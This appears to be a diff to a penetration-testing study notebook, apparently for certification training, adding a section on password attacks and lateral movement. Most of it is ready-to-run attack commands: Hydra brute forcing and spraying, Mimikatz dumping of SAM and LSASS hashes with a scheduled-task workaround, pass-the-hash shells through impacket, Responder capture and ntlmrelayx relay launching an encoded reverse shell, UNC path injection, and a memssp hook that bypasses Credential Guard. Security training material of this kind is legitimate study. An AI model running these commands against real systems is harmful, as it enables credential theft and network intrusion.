@@ -270,6 +270,163 @@ copy \\<attacker_ip>\share\shell.exe shell.exe
 
 ---
 
+### Phase 2.5: Password Attacks & Lateral Movement
+
+> Full walkthrough (Hydra, Hashcat, Mimikatz, Responder, ntlmrelayx, Credential Guard bypass): [[Password Attacks]]
+
+#### Step 1: Service Brute Force / Spraying (before or without a shell)
+
+```bash
+# Dictionary attack against SSH
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target>
+
+# Password spray against RDP (one password, many usernames -- avoids lockout)
+hydra -L users.txt -p "<password>" rdp://<target>
+
+# HTTP POST form (get field names and failure string from Burp first)
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> \
+  http-post-form "/<path>:<field>=^PASS^:<failure-string>"
+
+# HTTP basic auth
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt http-get://<target>/
+
+# Password spray or credential verification across a subnet (NetExec)
+netexec smb <target-or-subnet> -u <user> -p <password>
+netexec smb <target-or-subnet> -u <user> -p <password> --local-auth  # local account
+```
+Full command breakdown: [[Password Attacks (Breakdowns)#Hydra http-post-form: the three-field syntax|Command Breakdowns]]. Decision tree: [[Secrets & Credentials (Decision Tree)|Decision Tree]].
+
+#### Tags: #Hydra #PasswordSpraying #BruteForce #NetExec
+
+---
+
+#### Step 2: Post-Exploitation Credential Extraction (local admin on target)
+
+```powershell
+# Launch Mimikatz from the target (or from a schtasks workaround -- see below)
+.\mimikatz.exe
+```
+
+```
+# Standard Mimikatz privilege chain
+privilege::debug          # Enables SeDebugPrivilege (required for LSASS access)
+token::elevate            # Impersonates SYSTEM token
+lsadump::sam              # Dumps local NTLM hashes from SAM database
+
+# For cached domain credentials (plain NTLM -- can be passed; wdigest if Credential Guard off)
+sekurlsa::logonpasswords  # Reads from LSASS memory
+```
+
+> ⚠️ On Windows Server 2022: `token::elevate` gives a SYSTEM impersonation token but `lsadump::sam` still fails. Windows checks the PRIMARY process token (your user) not the impersonation token for SAM registry access. Fix: run Mimikatz via a scheduled task as an admin user so their token IS the primary token.
+
+```cmd
+# Schtask workaround when primary token blocks SAM access (FILES01/paul scenario)
+schtasks /create /tn "HashDump" /tr "cmd /c C:\tools\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > C:\tools\out.txt 2>&1" /sc once /st 00:00 /ru <machine>\<adminuser> /rp "<password>" /f
+schtasks /run /tn "HashDump"
+type C:\tools\out.txt
+```
+Full breakdown: [[Password Attacks (Breakdowns)#Mimikatz privilege chain: why the three-step sequence|Command Breakdowns]].
+
+```bash
+# Crack NTLM hash on Kali (mode 1000, no salt, fast)
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+```
+
+#### Tags: #Mimikatz #NTLM #SAM #LSASS #SeDebugPrivilege #Hashcat #Module16
+
+---
+
+#### Step 3: Pass-the-Hash (NTLM hash, no plaintext needed)
+
+Raw NTLM hashes (from SAM or LSASS) can be passed directly without cracking. Net-NTLMv2 hashes CANNOT be passed -- only cracked or relayed.
+
+```bash
+# Interactive SYSTEM shell via PtH (psexec always gives SYSTEM)
+impacket-psexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>
+
+# Shell as the authenticated user (wmiexec gives user context, no file drop)
+impacket-wmiexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>
+
+# Access an SMB share with a hash (no shell, just file access)
+smbclient \\\\<target>\\<share> -U Administrator --pw-nt-hash <NThash>
+```
+
+> LM hash portion is always 32 zeros on modern Windows (LM disabled). Format: `LMhash:NThash`.
+
+> UAC remote restrictions apply: local admin accounts other than the actual `Administrator` (RID 500) can authenticate but won't get code execution via psexec. Domain accounts and the built-in Administrator are unaffected.
+
+Decision tree for hash type: [[Secrets & Credentials (Decision Tree)#Got a hash from a Windows machine|Decision Tree]].
+
+#### Tags: #PassTheHash #PtH #impacket #psexec #wmiexec #UAC #Module16
+
+---
+
+#### Step 4: Net-NTLMv2 Capture and Relay
+
+When a Windows machine makes an outbound SMB connection to your Kali box, Responder intercepts the authentication and captures the Net-NTLMv2 hash.
+
+```bash
+# Terminal 1: start Responder on VPN interface
+sudo responder -I tun0
+
+# Terminal 2: from a foothold on the victim -- trigger SMB auth to Kali
+dir \\<kali-ip>\test    # "Access is denied" is expected -- Responder still captures the hash
+```
+
+```bash
+# Crack Net-NTLMv2 hash offline (mode 5600)
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+# OR relay it live to a second target (when cracking fails or takes too long)
+# Requirement: relayed user must have local admin on the relay target
+impacket-ntlmrelayx --no-http-server -smb2support -t <relay-target-ip> \
+  -c "powershell -enc <UTF-16LE-base64-reverse-shell>"
+
+# Generate the base64 payload (Python, UTF-16LE -- plain ASCII breaks -enc)
+python3 -c "import base64; cmd='<reverse-shell-oneliner>'; print(base64.b64encode(cmd.encode('utf-16-le')).decode())"
+```
+
+Trigger the victim's SMB auth toward Kali with ntlmrelayx running (not Responder -- both can't own port 445 at the same time):
+```cmd
+dir \\<kali-ip>\test
+```
+
+Full breakdown: [[Password Attacks (Breakdowns)#PowerShell -enc requires UTF-16LE base64, not plain ASCII|Command Breakdowns]].
+
+**UNC filename injection variant:** if a web file upload handler uses Go's `filepath.Join(uploadDir, filename)` on Windows, a filename like `//kali-ip/share/file` is treated as an absolute UNC path. The server process authenticates to Kali when processing the upload -- captures the service account's Net-NTLMv2 hash without any victim action.
+
+#### Tags: #NetNTLMv2 #Responder #NTLMRelay #ntlmrelayx #Hashcat #UNCInjection #Module16
+
+---
+
+#### Step 5: Credential Guard Bypass (memssp)
+
+When Credential Guard is active, `sekurlsa::logonpasswords` shows encrypted `LSA Isolated Data` blobs instead of plaintext. memssp bypasses this by hooking SSPI before encryption.
+
+```powershell
+# Detect Credential Guard
+Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
+# Look for "CredentialGuard" in output
+```
+
+```
+# Inside Mimikatz (requires local admin / SeDebugPrivilege)
+privilege::debug
+misc::memssp    # injects hook into LSASS, writes captured creds to C:\Windows\System32\mimilsa.log
+
+# After a new user authenticates on this machine:
+type C:\Windows\System32\mimilsa.log
+# [session-id] DOMAIN\Username  plaintextpassword
+```
+
+> memssp only survives until reboot. It only captures NEW authentication events after injection -- pre-existing sessions are not logged. In a real engagement: inject, wait (or coerce a reconnect), return to read the log.
+
+Full breakdown: [[Password Attacks (Breakdowns)#memssp: why SSPI-layer intercept beats Credential Guard|Command Breakdowns]].
+
+#### Tags: #CredentialGuard #memssp #Mimikatz #SSPI #VBS #VTL #Module16
+
+---
+
 ### Phase 3: Privilege Escalation
 
 #### Step 1: Quick Enumeration
